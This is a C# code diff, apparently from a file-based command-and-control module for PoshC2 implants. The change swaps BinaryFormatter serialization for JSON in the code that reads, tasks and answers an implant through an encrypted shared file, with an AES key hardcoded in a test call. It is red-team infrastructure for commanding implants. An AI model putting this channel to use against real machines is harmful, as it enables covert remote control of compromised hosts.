@@ -13,6 +13,7 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Reflection;
+using Newtonsoft.Json;
 
 namespace FComm
 {
@@ -129,7 +130,7 @@ namespace FComm
         }
 
     }
-    sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
+    /*sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
     {
         public override Type BindToType(string assemblyName, string typeName)
         {
@@ -139,7 +140,7 @@ namespace FComm
             }
             return Type.GetType("FComm.RHDataGram");
         }
-    }
+    }*/
 
 
     public class Class1
@@ -153,7 +154,7 @@ namespace FComm
         {
             Console.WriteLine(String.Join(",", args));
             //Start(args);
-            Start(new string[] {"Start","c:\\users\\public\\test.ost","c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c="});
+            Start(new string[] { "Start", "c:\\users\\public\\test.ost", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
             /*
             Start(new string[] { "Start", "ATHOMPSON", "msukpipereader", "mtkn4", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
             Console.ReadLine();
@@ -174,7 +175,7 @@ namespace FComm
         public static void Start(string[] args)
         {
             bool Running = false;
-            
+
 
             if (args.Length == 3 && args[0].ToLower() == "start") // If in format 'Start <filepath> <key>'
             {
@@ -184,41 +185,45 @@ namespace FComm
                 FComm = new RHServer(FilePath); //create an object.
                 Running = true;
                 Init(FComm);
-            }
-
-            var command = $"{string.Join(" ", args)}";
-            if (command.ToLower().StartsWith("kill"))
-            {
-                IssueCommand(command, FComm, Running);
                 Running = false;
-                //assume the kill command works - maybe need to remove the implant from poshc2?
             }
             else
             {
-                IssueCommand(command, FComm, Running);
+                var command = $"{string.Join(" ", args)}";
+                if (command.ToLower().StartsWith("kill"))
+                {
+                    IssueCommand(command, FComm, Running);
+                    Running = false;
+                    //assume the kill command works - maybe need to remove the implant from poshc2?
+                }
+                else
+                {
+                    IssueCommand(command, FComm, Running);
+                }
             }
+
         }
 
         /// <summary>
         /// Will issue the specified command to the pipe and read the response
         /// </summary>
-		public static void Init(RHServer FComm)
-        { 
+        public static void Init(RHServer FComm)
+        {
             lock (_lock)
             {
                 try
                 {
-                    byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
-                    Console.WriteLine("Bytes: " + DataToParseBytes.Length);
+                    string DataToParseJson = Decrypt(Encryptionkey, FComm.Receive());
+                    Console.WriteLine("Bytes: " + DataToParseJson.Length);
                     //Step 1: STREAM
-                    MemoryStream stream = new MemoryStream(DataToParseBytes);
-                    BinaryFormatter bf = new BinaryFormatter();
+                    //MemoryStream stream = new MemoryStream(DataToParseBytes);
+                    //BinaryFormatter bf = new BinaryFormatter();
                     //Fix the assembly name.
-                    bf.Binder = new PreMergeToMergedDeserializationBinder();
+                    //bf.Binder = new PreMergeToMergedDeserializationBinder();
                     //Step 2: DESERIALIZE!
-                    List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
-                    Console.WriteLine(DataToParse.ToString());
-                    stream.Dispose();
+                    List<RHDataGram> DataToParse = JsonConvert.DeserializeObject<List<RHDataGram>>(DataToParseJson);
+                    //Console.WriteLine(DataToParse.ToString());
+                    //stream.Dispose();
                     foreach (RHDataGram Task in DataToParse)
                     {
                         if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
@@ -229,10 +234,11 @@ namespace FComm
                             continue;
                         }
                     }
-                    MemoryStream stream2 = new MemoryStream();
-                    bf.Serialize(stream2, DataToParse);
-                    var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
-                    stream2.Dispose();
+                    //MemoryStream stream2 = new MemoryStream();
+                    //bf.Serialize(stream2, DataToParse);
+                    string jss = JsonConvert.SerializeObject(DataToParse);
+                    var DataToGo = Encrypt(Encryptionkey, jss); //list is encrypted.
+                    //stream2.Dispose();
                     //Send the DATAAAAAAAAAHH!!!
                     FComm.SendData(DataToGo);
                 }
@@ -257,28 +263,22 @@ namespace FComm
                         //Get file contents
                         //decrypt the contents
 
-                        byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
+                        string DataToParseJson = Decrypt(Encryptionkey, FComm.Receive());
                         //Step 1: STREAM
-                        MemoryStream stream = new MemoryStream(DataToParseBytes);
-                        BinaryFormatter bf = new BinaryFormatter();
-                        bf.Binder = new PreMergeToMergedDeserializationBinder();
+                        //MemoryStream stream = new MemoryStream(DataToParseJson);
+                        //BinaryFormatter bf = new BinaryFormatter();
+                        //bf.Binder = new PreMergeToMergedDeserializationBinder();
                         //Step 2: DESERIALIZE!
-                        List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
-                        stream.Dispose();
+                        List<RHDataGram> DataToParse = JsonConvert.DeserializeObject<List<RHDataGram>>(DataToParseJson);
+                        //stream.Dispose();
 
                         foreach (RHDataGram Task in DataToParse)
                         {
-                            if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
+                            if (Task.Actioned == true && Task.PacketType != "INIT" && Task.Retrieved == false) //It's output from a command!.
                             {
                                 Console.WriteLine(Task.Output);
                                 Task.Retrieved = true;
-                                continue;
-                            }
-                            if (Task.Actioned == true && Task.PacketType != "INIT") //It's output from a command!.
-                            {
-                                Console.WriteLine(Task.Output);
-                                Task.Retrieved = true;
-                                Running = false;
+                                Running = false; //This only works because we're only working with single tasks right now. Proper Ghetto.
                             }
                             if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
                             {
@@ -287,10 +287,11 @@ namespace FComm
                             }
 
                         }
-                        MemoryStream stream2 = new MemoryStream();
-                        bf.Serialize(stream, DataToParse);
-                        var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
-                        stream.Dispose();
+                        //MemoryStream stream2 = new MemoryStream();
+                        //bf.Serialize(stream, DataToParse);
+                        string jss2 = JsonConvert.SerializeObject(DataToParse);
+                        var DataToGo = Encrypt(Encryptionkey,jss2); //list is encrypted.
+                        //stream.Dispose();
                         //Send the DATAAAAAAAAAHH!!!
                         FComm.SendData(DataToGo);
                     }
@@ -303,7 +304,7 @@ namespace FComm
             }
         }
 
-        private static byte[] Decrypt(string key, string ciphertext)
+        private static string Decrypt(string key, string ciphertext)
         {
             var rawCipherText = Convert.FromBase64String(ciphertext);
             var IV = new Byte[16];
@@ -312,13 +313,13 @@ namespace FComm
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted.ToArray();
+                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
             }
             catch
             {
                 var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
                 var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
-                return decrypted.ToArray();
+                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
             }
             finally
             {
